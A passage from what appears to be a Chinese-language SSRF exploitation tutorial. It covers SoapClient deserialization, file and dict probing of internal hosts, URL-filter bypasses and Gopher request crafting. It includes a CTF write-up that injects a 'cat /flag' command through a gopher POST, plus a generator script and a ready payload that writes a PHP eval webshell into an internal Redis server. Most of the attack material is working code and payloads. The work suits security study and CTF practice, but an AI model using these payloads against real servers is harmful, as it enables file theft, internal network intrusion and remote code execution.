客户端。\n\nSoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的`__call`方法，那么`__call`便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：\n\npublic SoapClient :: SoapClient(mixed $wsdl \\[，array $options \\])\n\n+   第一个参数是用来指明是否是wsdl模式。\n    \n+   第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。\n    \n\n知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target\\_url：\n\n```\n// ssrf.php  \n<?php  \n$a = new SoapClient(null,array('uri'=>'http://47.xxx.xxx.72:2333', 'location'=>'http://47.xxx.xxx.72:2333/aaa'));  \n$b = serialize($a);  \necho $b;  \n$c = unserialize($b);  \n$c->a();    // 随便调用对象中不存在的方法, 触发\\_\\_call方法进行ssrf  \n?>\n```\n\n47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：\n\n![image-20210112234821125](https://image.3001.net/images/20210114/1610597999_5fffc66f758c21c129c42.png!small)\n\n如上图所示，ssrf触发成功。\n\n由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：[《SoapClient+crlf组合拳进行SSRF》](https://www.anquanke.com/post/id/202025)\n\n### SSRF漏洞利用的相关协议\n\nSSRF漏洞的利用所涉及的协议有：\n\n+   file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\n    \n+   dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\n    \n+   gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\n    \n+   http/s协议：探测内网主机存活\n    \n\n下面我们对这些协议的利用进行逐一演示。\n\n## 常见利用方式（file、http/s和dict协议）\n\nSSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。\n\n以下几个演示所用的测试代码：\n\n```\n// ssrf.php\n<?php \nif (isset($\\_GET\\['url'\\])){\n\t$link = $\\_GET\\['url'\\];\n\t$curlobj = curl\\_init(); // 创建新的 cURL 资源\n\tcurl\\_setopt($curlobj, CURLOPT\\_POST, 0);\n\tcurl\\_setopt($curlobj,CURLOPT\\_URL,$link);\n\tcurl\\_setopt($curlobj, CURLOPT\\_RETURNTRANSFER, 1); // 设置 URL 和相应的选项\n\t$result=curl\\_exec($curlobj); // 抓取 URL 并把它传递给浏览器\n\tcurl\\_close($curlobj); // 关闭 cURL 资源，并且释放系统资源\n```\n\n\n\n\t// $filename = './curled/'.rand().'.txt';\n\t// file\\_put\\_contents($filename, $result); \n\techo $result;\n}\n?>\n\n### 读取内网文件（file协议）\n\n我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：\n\nssrf.php?url=file:///etc/passwd  \nssrf.php?url=file:///var/www/html/flag.php\n\n![image-20210113000529370](https://image.3001.net/images/20210114/1610598000_5fffc670560e2d6fed29c.png!small)\n\n![image-20210113000640979](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201861.jpeg)\n\n### 探测内网主机存活（http/s协议）\n\n一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib\\_trie等文件，从而获得目标主机的内网网段并进行爆破。\n\n域网IP地址范围分三类，以下IP段为内网IP段：\n\n+   C类：192.168.0.0 - 192.168.255.255\n    \n+   B类：172.16.0.0 - 172.31.255.255\n    \n+   A类：10.0.0.0 - 10.255.255.255\n    \n\n测试环境如下：\n\n![image-20210113190506825](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201380.jpeg)\n\n假设WEB服务器Ubuntu上面存在上述所说的SSRF漏洞，我们构造如下payload，便可通过Ubuntu服务器发送请求去探测内网存活的主机：\n\nssrf.php?url=http://192.168.52.1  \nssrf.php?url=http://192.168.52.6  \nssrf.php?url=http://192.168.52.25  \n......\n\n为了方便，我们可以借助burpsuite的Intruder模块进行爆破，如下所示：\n\n![image-20210113120505690](https://image.3001.net/images/20210114/1610598003_5fffc67301c9d222a58c6.png!small)\n\n![image-20210113120551977](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201508.jpeg)\n\n将爆破的线程尽可能设的小一些。开始爆破后即可探测到目标内网中存在如下两个存活的主机（192.168.52.130和192.168.52.131）：\n\n![image-20210113120806794](https://image.3001.net/images/20210114/1610598005_5fffc6750b23dd040c364.png!small)\n\n### 扫描内网端口（http/s和dict协议）\n\n同样是上面那个测试环境：\n\n![image-20210113190455756](https://image.3001.net/images/20210114/1610598006_5fffc67625206702cdd18.png!small)\n\n我们利用dict协议构造如下payload即可查看内网主机上开放的端口及端口上运行服务的版本信息等：\n\nssrf.php?url=dict://192.168.52.131:6379/info   // redis  \nssrf.php?url=dict://192.168.52.131:80/info     // http  \nssrf.php?url=dict://192.168.52.130:22/info   // ssh\n\n![image-20210113190244954](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201787.jpeg)\n\n![image-20210113122530377](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201476.jpeg)\n\n同样可以借助burpsuite来爆破内网主机上的服务。\n\n## 相关绕过姿势\n\n对于SSRF的限制大致有如下几种：\n\n+   限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。\n    \n+   限制域名只能为[http://www.xxx.com](http://www.xxx.com/)\n    \n+   限制不能访问内网的IP，以防止对内网进行攻击。\n    \n+   屏蔽返回的详细信息。\n    \n\n### 利用HTTP基本身份认证的方式绕过\n\n如果目标代码限制访问的域名只能为 [http://www.xxx.com](http://www.xxx.com/)，那么我们可以采用HTTP基本身份认证的方式绕过。即@：[http://www.xxx.com@www.evil.com](http://www.evil.com/)\n\n### 利用302跳转绕过内网IP\n\n绕过对内网ip的限制我们可以**利用302跳转**的方法，有以下两种。\n\n（1）网络上存在一个很神奇的服务，网址为 [http://xip.io](http://xip.io/)，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：\n\n当我们访问：[http://127.0.0.1.xip.io/flag.php](http://127.0.0.1.xip.io/flag.php)时，实际访问的是[http://127.0.0.1/1.php](http://127.0.0.1/1.php)。像这种网址还有[http://nip.io](http://nip.io/)，[http://sslip.io](http://sslip.io/)。\n\n如下示例（flag.php仅能从本地访问）：\n\n![image-20210113124813254](https://image.3001.net/images/20210114/1610598008_5fffc67858617e4b20974.png!small)\n\n（2）短地址跳转绕过，这里也给出一个网址 [https://4m.cn/](https://4m.cn/)：\n\n![image-20201027163528110](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201164.jpeg)\n\n直接使用生成的短连接 [https://4m.cn/FjOdQ](https://4m.cn/FjOdQ)就会自动302跳转到 [http://127.0.0.1/flag.php](http://127.0.0.1/flag.php)上，这样就可以绕过WAF了：\n\n![image-20210113124727560](https://image.3001.net/images/20210114/1610598010_5fffc67a644209d507f01.png!small)\n\n### 进制的转换绕过内网IP\n\n可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个从网上扒的php脚本可以一键转换：\n\n```\n<?php  \n$ip = '127.0.0.1';  \n$ip = explode('.',$ip);  \n$r = ($ip\\[0\\] << 24) | ($ip\\[1\\] << 16) | ($ip\\[2\\] << 8) | $ip\\[3\\] ;  \nif($r < 0) {  \n$r += 4294967296;  \n}  \necho \"十进制:\";     // 2130706433  \necho $r;  \necho \"八进制:\";     // 0177.0.0.1  \necho decoct($r);  \necho \"十六进制:\";   // 0x7f.0.0.1  \necho dechex($r);  \n?>\n```\n\n\n\n### 其他各种指向127.0.0.1的地址\n\nhttp://localhost/         # localhost就是代指127.0.0.1  \nhttp://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1  \nhttp://\\[0:0:0:0:0:ffff:127.0.0.1\\]/    # 在liunx下可用，window测试了下不行  \nhttp://\\[::\\]:80/           # 在liunx下可用，window测试了下不行  \nhttp://127。0。0。1/       # 用中文句号绕过  \nhttp://①②⑦.⓪.⓪.①  \nhttp://127.1/  \nhttp://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1\n\n### 利用不存在的协议头绕过指定的协议头\n\n`file_get_contents()`函数的一个特性，即当PHP的`file_get_contents()`函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）\n\n测试代码：\n\n```\n// ssrf.php  \n<?php  \nhighlight\\_file(\\_\\_FILE\\_\\_);  \nif(!preg\\_match('/^https/is',$\\_GET\\['url'\\])){  \ndie(\"no hack\");  \n}  \necho file\\_get\\_contents($\\_GET\\['url'\\]);  \n?>\n```\n\n上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：\n\nhttpsssss://\n\n此时`file_get_contents()`函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：\n\nssrf.php?url=httpsssss://../../../../../../etc/passwd\n\n![image-20210113130534208](https://image.3001.net/images/20210114/1610598011_5fffc67b28e67ca0b6d7f.png!small)\n\n这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。\n\n### 利用URL的解析问题\n\n该思路来自Orange Tsai成员在2017 BlackHat 美国黑客大会上做的题为[《A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages》](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)的分享。主要是利用readfile和parse\\_url函数的解析差异以及curl和parse\\_url解析差异来进行绕过。\n\n**（1）利用readfile和parse\\_url函数的解析差异绕过指定的端口**\n\n测试代码：\n\n```\n// ssrf.php\n<?php\n$url = 'http://'. $\\_GET\\[url\\];\n$parsed = parse\\_url($url);\nif( $parsed\\[port\\] == 80 ){  // 这里限制了我们传过去的url只能是80端口的\n\treadfile($url);\n} else {\n\tdie('Hacker!');\n}\n```\n\n用python在当前目录下起一个端口为11211的WEB服务：\n\n![image-20210113133210683](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252201658.jpeg)\n\n上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：\n\nssrf.php?url=127.0.0.1:11211:80/flag.txt\n\n![image-20210113133242461](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202332.jpeg)\n\n如上图所示成功读取了11211端口中的flag.txt文件，下面用BlackHat的图来说明原理：\n\n![1610601312_5fffd36035478c41c2c18.png!small?1610601312696](https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696)\n\n从上图中可以看出readfile()函数获取的端口是最后冒号前面的一部分（11211），而parse\\_url()函数获取的则是最后冒号后面的的端口（80），利用这种差异的不同，从而绕过WAF。\n\n这两个函数在解析host的时候也有差异，如下图：\n\n![1610601347_5fffd383dfc1a3982425f.png!small?1610601348433](https://image.3001.net/images/20210114/1610601347_5fffd383dfc1a3982425f.png!small?1610601348433)\n\nreadfile()函数获取的是@号后面一部分（evil.com），而parse\\_url()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parse\\_url()函数对指定host的限制。\n\n**（2）利用curl和parse\\_url的解析差异绕指定的host**\n\n原理如下：\n\n![1610601386_5fffd3aa565a51587d90c.png!small?1610601386867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202234.jpeg)\n\n从上图中可以看到curl()函数解析的是第一个@后面的网址，而parse\\_url()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parse\\_url()函数对指定host的限制。\n\n测试代码：\n\n```\n<?php\nhighlight\\_file(\\_\\_FILE\\_\\_);\nfunction check\\_inner\\_ip($url)\n{\n    $match\\_result=preg\\_match('/^(http|https)?:\\\\/\\\\/.\\*(\\\\/)?.\\*$/',$url);\n    if (!$match\\_result)\n    {\n        die('url fomat error');\n    }\n    try\n    {\n        $url\\_parse=parse\\_url($url);\n    }\n    catch(Exception $e)\n    {\n        die('url fomat error');\n        return false;\n    }\n    $hostname=$url\\_parse\\['host'\\];\n    $ip=gethostbyname($hostname);\n    $int\\_ip=ip2long($ip);\n    return ip2long('127.0.0.0')>>24 == $int\\_ip>>24 || ip2long('10.0.0.0')>>24 == $int\\_ip>>24 || ip2long('172.16.0.0')>>20 == $int\\_ip>>20 || ip2long('192.168.0.0')>>16 == $int\\_ip>>16;// 检查是否是内网ip\n}\nfunction safe\\_request\\_url($url)\n{\n    if (check\\_inner\\_ip($url))\n    {\n        echo $url.' is inner ip';\n    }\n    else\n    {\n        $ch = curl\\_init();\n        curl\\_setopt($ch, CURLOPT\\_URL, $url);\n        curl\\_setopt($ch, CURLOPT\\_RETURNTRANSFER, 1);\n        curl\\_setopt($ch, CURLOPT\\_HEADER, 0);\n        $output = curl\\_exec($ch);\n        $result\\_info = curl\\_getinfo($ch);\n        if ($result\\_info\\['redirect\\_url'\\])\n        {\n            safe\\_request\\_url($result\\_info\\['redirect\\_url'\\]);\n        }\n        curl\\_close($ch);\n        var\\_dump($output);\n    }\n}\n$url = $\\_GET\\['url'\\];\nif(!empty($url)){\n    safe\\_request\\_url($url);\n}\n?>\n```\n\n上述代码中可以看到`check_inner_ip`函数通过`url_parse()`函数检测是否为内网IP，如果不是内网 IP ，则通过`curl()`请求 url 并返回结果，我们可以利用curl和parse\\_url解析的差异不同来绕过这里的限制，让`parse_url()`处理外部网站网址，最后`curl()`请求内网网址。paylaod如下：\n\nssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php\n\n![image-20210113134443846](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202304.jpeg)\n\n的 [\\[2020 首届“祥云杯”网络安全大赛\\]doyouknowssrf](https://whoamianony.top/2020/11/24/ctf-bi-sai-ji-lu/2020-shou-jie-xiang-yun-bei-wang-luo-an-quan-da-sai-writeup/#toc-heading-5)这道题利用的就是这个思路。\n\n## 常见攻击方式（Gopher协议）\n\n### Gopher协议在SSRF中的利用\n\nGopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用TCP 70端口。但在WWW出现后，Gopher失去了昔日的辉煌。\n\n现在的Gopher协议已经很少有人再使用它了，但是该协议在SSRF中却可以发挥巨大的作用，可以说是SSRF中的万金油。由于Gopher协议支持发出GET、POST请求，我们可以先截获GET请求包和POST请求包，再构造成符合Gopher协议请求的payload进行SSRF利用，甚至可以用它来攻击内网中的Redis、MySql、FastCGI等应用，这无疑大大扩展了我们的SSRF攻击面。\n\n**（1）Gopher协议格式**\n\nURL: gopher://<host>:<port>/<gopher-path>\\_后接TCP数据流  \n\n\\# 注意不要忘记后面那个下划线\"\\_\"，下划线\"\\_\"后面才开始接TCP数据流，如果不加这个\"\\_\"，那么服务端收到的消息将不是完整的，该字符可随意写。\n\n+   gopher的默认端口是70\n    \n+   如果发起POST请求，回车换行需要使用`%0d%0a`来代替`%0a`，如果多个参数，参数之间的&也需要进行URL编码\n    \n\n> 那么如何利用Gopher发送HTTP的请求呢？例如GET请求。我们直接发送一个原始的HTTP包不就行了吗。在gopher协议中发送HTTP的数据，需要以下三步：\n>\n> 1.  抓取或构造HTTP数据包\n>\n> 2.  URL编码、将回车换行符`%0a`替换为`%0d%0a`\n>\n> 3.  发送符合gopher协议格式的请求\n>\n\n**（2）利用Gopher协议发送HTTP GET请求**\n\n测试代码：\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_GET\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\n接下来我们构造payload。一个典型的GET型的HTTP包类似如下：\n\n```\nGET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72\n```\n\n然后利用以下脚本进行一步生成符合Gopher协议格式的payload：\n\n```\nimport urllib.parse  \npayload =\\\\  \n\"\"\"GET /echo.php?whoami=Bunny HTTP/1.1  \nHost: 47.xxx.xxx.72  \n\"\"\"    \n```\n\n\\# 注意后面一定要有回车，回车结尾表示http请求结束  \n\n```\ntmp = urllib.parse.quote(payload)  \nnew = tmp.replace('%0A','%0D%0A')  \nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new  \nprint(result)\n```\n\n![image-20210113170748727](https://image.3001.net/images/20210114/1610598015_5fffc67f7078252c1e5a9.png!small)\n\n> **注意这几个问题：**\n>\n> 1.  问号（?）需要转码为URL编码，也就是%3f\n>\n> 2.  回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a\n>\n> 3.  在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）\n>\n\n然后执行：\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_GET%20/echo.php%3Fwhoami%3DBunny%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0A\n```\n\n![image-20210113171043970](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202964.jpeg)\n\n如上图，成功用GET方法传参并输出“Hello Bunny”。\n\n**（3）利用Gopher协议发送HTTP POST请求**\n\n测试代码：\n\n```\n// echo.php  \n<?php  \necho \"Hello \".$\\_POST\\[\"whoami\"\\].\"\\\\n\"  \n?>\n```\n\n接下来我们构造payload。一个典型的POST型的HTTP包类似如下：\n\n```\nPOST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n```\n\n**注意：上面那四个HTTP头是POST请求必须的，即POST、Host、Content-Type和Content-Length。如果少了会报错的，而GET则不用。并且，特别要注意Content-Length应为字符串“whoami=Bunny”的长度。**\n\n最后用脚本我们将上面的POST数据包进行URL编码并改为gopher协议\n\n```\nimport urllib.parse\npayload =\\\\\n\"\"\"POST /echo.php HTTP/1.1\nHost: 47.xxx.xxx.72\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 12\n\nwhoami=Bunny\n\"\"\"  \n```\n\n\n# 注意后面一定要有回车，回车结尾表示http请求结束\n```\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://47.xxx.xxx.72:80/'+'\\_'+new\nprint(result)\n```\n\n![image-20210113171513366](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg)\n\n然后执行：\n\n```\ncurl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A\n```\n\n![image-20210113171641047](https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small)\n\n如上图，成功用POST方法传参并输出“Hello Bunny”。\n\n**\\[2020 科来杯初赛\\]Web1**这道题就是典型的运用Gopher发送HTTP POST请求进行SSRF攻击的思路。\n\n### \\[2020 科来杯初赛\\]Web1\n\n进入题目后即给处源码：\n\n![image-20200921134331679](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg)\n\n这里很明显就是一个SSRF，url过滤了`file`、`ftp`，但是必须要包含`127.0.0.1`。并且，我们还发现一个tool.php页面，但是该页面进去之后仅显示一个“Not localhost”，我们可以用这个ssrf将tool.php的源码读住来，构造反序列化payload：\n\n```\n<?php  \nclass Welcome {  \nprotected $url = \"http://127.0.0.1/tool.php\";\n\n}  \n$poc = new Welcome;  \n//echo serialize($poc);  \necho urlencode(serialize($poc));  \n?>\n```\n\n生成：\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D\n\n// O:7:\"Welcome\":1:{s:6:\"\\*url\";s:25:\"http://127.0.0.1/tool.php\";}\n```\n\n将Welcome后面表示对象属性个数的“1”改为“2”即可绕过`__destruct()`的限制。\n\n![image-20200921134812338](https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small)\n\n读出来tool.php的源码为：\n\n```\n#tool.php\n<?php\nerror\\_reporting(0);\n$respect\\_show\\_ping = function($params) {\n   extract($params);\n   $ip = isset($ip) ? $ip :'127.0.0.1';\n   system('ping -c 1 '.$ip);\n};\nif ($\\_SERVER\\[\"REMOTE\\_ADDR\"\\] !== \"127.0.0.1\"){\n   echo '<h2>Not localhost!</h2>';\n}\nelse {\n   highlight\\_file(\\_\\_FILE\\_\\_);\n   $respect\\_show\\_ping($\\_POST);\n}\n?>\n```\n\n可知tool.php页面存在命令执行漏洞。当REMOTE\\_ADDR为127.0.0.1时才可执行命令。REMOTE\\_ADDR头获取的是客户端的真实的IP，但是这个客户端是相对服务器而言的，也就是实际上与服务器相连的机器的IP（建立tcp连接的那个），这个值是不可以伪造的，如果没有代理的话，这个值就是用户实际的IP值，有代理的话，用户的请求会经过代理再到服务器，这个时候REMOTE\\_ADDR会被设置为代理机器的IP值。而X-Forwarded-For的值是可以篡改的。\n\n既然这里要求当REMOTE\\_ADDR为127.0.0.1时才可执行命令，且REMOTE\\_ADDR的值是不可以伪造的，我们要想让REMOTE\\_ADDR的值为127.0.0.1，不可能通过修改X-Forwarded-For的值来实现，我们要利用SSRF。\n\n我们可以利用index.php页面的SSRF利用gopher协议发POST包请求tool.php，进行命令执行。这样，整个攻击过程是在服务端进行的REMOTE\\_ADDR的值也就是127.0.0.1了。\n\nSSRF，利用gopher发POST包，进行命令执行\n\n```\nimport urllib.parse\ntest =\\\\\n\"\"\"POST /tool.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 13\n\nip=;cat /flag\n\"\"\"  \n```\n\n#注意后面一定要有回车，回车结尾表示http请求结束\n\n```\ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'\\_'+new\nprint(result)\n```\n\n这里因为我们是把payload发送到服务端让服务端执行，所以我们的Host和gopher里的Host为127.0.0.1。\n\n生成gopher协议格式的payload为：\n\n```\ngopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\n```\n\n然后构造反序列化exp：\n\n```\n<?php\nclass Welcome {\n    protected $url = \"gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A\";\n    \n}\n$poc = new Welcome;\n//echo serialize($poc);\necho urlencode(serialize($poc));\n?>\n```\n\n生成payload：\n\n```\nO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D\n\n\n```\n\n同样将Welcome后面表示对象属性个数的“1”改为“2”绕过`__destruct()`的限制后执行：\n\n![image-20200921135622488](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg)\n\n如上图，命令执行成功。\n\n**注意：**这里要注意的是，我们发送的是POST包，而如果发送的是GET包的话，当这个URL经过服务器时，payload部分会被自动url解码，%20等字符又会被转码为空格。所以，curl\\_exec在发起gopher时用的就是没有进行URL编码的值，就导致了现在的情况，所以我们要对payload进行二次URL编码。编码结果类似如下：\n\n```\ngopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A\n```\n\n\n\n## 攻击内网Redis\n\n![20210113151633.png](https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small)\n\nRedis是数据库的意思。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。\n\n> **什么是Redis未授权访问？**\n>\n> Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized\\_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。\n>\n> 简单说，漏洞的产生条件有以下两点：\n>\n> +   redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。\n>\n> +   没有设置密码认证（一般为空），可以免密码远程登录redis服务。\n>\n\n在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等，其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。\n\n下面我们对攻击Redis的手法进行演示。测试环境如下，内网中其他主机均有外网IP并可以上网：\n\n![image-20210113190430425](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg)\n\n在上文扫描内网端口的实验中，我们发现了内网中有一个IP为192.168.52.131的主机在6379端口上运行着一个Redis服务，下面我们就用它来演示，通过Ubuntu服务器上的SSRF漏洞去攻击内网主机（192.168.52.131）的Redis。\n\n### 绝对路径写WebShell\n\n首先构造redis命令：\n\n```\nflushall  \nset 1 '<?php eval($\\_POST\\[\"whoami\"\\]);?>'  \nconfig set dir /var/www/html  \nconfig set dbfilename shell.php  \nsave\n```\n\n然后写一个脚本，将其转化为Gopher协议的格式（脚本时从网上嫖的，谁让我菜呢~~~大佬勿喷）：\n\n```\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.52.131\"\nport=\"6379\"\nshell=\"\\\\n\\\\n<?php eval($\\_POST\\[\\\\\"whoami\\\\\"\\]);?>\\\\n\\\\n\"\nfilename=\"shell.php\"\npath=\"/var/www/html\"\npasswd=\"\"\ncmd=\\[\"flushall\",\n\t \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),\n\t \"config set dir {}\".format(path),\n\t \"config set dbfilename {}\".format(filename),\n\t \"save\"\n\t \\]\nif passwd:\n\tcmd.insert(0,\"AUTH {}\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/\\_\"\ndef redis\\_format(arr):\n\tCRLF=\"\\\\r\\\\n\"\n\tredis\\_arr = arr.split(\" \")\n\tcmd=\"\"\n\tcmd+=\"\\*\"+str(len(redis\\_arr))\n\tfor x in redis\\_arr:\n\t\tcmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \")\n\tcmd+=CRLF\n\treturn cmd\n\nif \\_\\_name\\_\\_==\"\\_\\_main\\_\\_\":\n\tfor x in cmd:\n\t\tpayload += urllib.quote(redis\\_format(x))\n\tprint payload\n```\n\n执行后生成paylaod如下：\n\n![image-20210113175116867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg)\n\n这里将生成的payload要进行url二次编码（因为我们发送payload用的是GET方法），然后利用Ubuntu服务器上的SSRF漏洞，将二次编码后的payload打过去就行了：\n\n```\nssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A\n```\n\n如下所示，成功在主机192.168.52.131上面写入WebShell：\n\n![image-20210113185919592](https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small)\n\n### 